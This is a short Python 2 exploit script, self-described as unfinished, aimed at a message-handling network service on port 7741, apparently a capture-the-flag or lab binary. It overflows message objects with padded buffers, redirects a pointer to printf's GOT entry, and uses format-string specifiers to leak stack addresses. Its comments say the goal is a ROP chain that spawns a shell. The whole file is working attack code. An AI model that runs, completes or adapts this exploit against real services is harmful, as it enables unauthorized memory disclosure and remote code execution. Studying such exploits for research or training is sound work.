#!/usr/bin/python

#
# This exploit is not finished. It ends up on leaking stack address
# via ROP to printf.
#
# The main problem from that point will be to construct proper ROP chain
# which via int 0x80 would spawn a shell and execute the command, but the 
# stack after we got into "call *eax"" is not easily controllable, therefore
# more work to get into such state is needed.
#

import time
import socket
import struct
import telnetlib

#HOST = "192.168.56.103"
HOST = "127.0.0.1"
PORT = 7741

sock = None

def pack(x):
    return struct.pack("<I", x)

# Addresses and constants
printf_got = pack(0x8050260)


def recvall():
    data = ''
    while True:
        try:
            c = sock.recv(1)
            if not c: break
            data += c
        except:
            break
    return data

def send(*x):
    data = ''
    for p in x:
        sock.send(str(p) + "\n")
        time.sleep(0.1)
        data += recvall()
    return data

if __name__ == '__main__':
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(0.2)
    sock.connect((HOST, PORT))

    print "Step 1. Create two message objects"
    send(1, 131, "A" * 127 + "\x01\x01\x01\x00")
    send(1, 16, "abcd")

    print "Step 2. Leak stack address and others via ROP to printf"
    ret1 = printf_got 
    send(2, 0, "B" * 140 + ret1 + "{%17$08x,%18$08x,%19$08x}")

    print "Step 3: Print second message -> Invoke overwritten pointer (RCE)."
    out = send(4, 1).split('\n')[1]
    out = out[out.find('{')+1:out.find('}')]
    stack = int("0x" + out.split(',')[1], 16)

    print "[~] Leaked stack address: 0x%08x" % stack
    send(5)
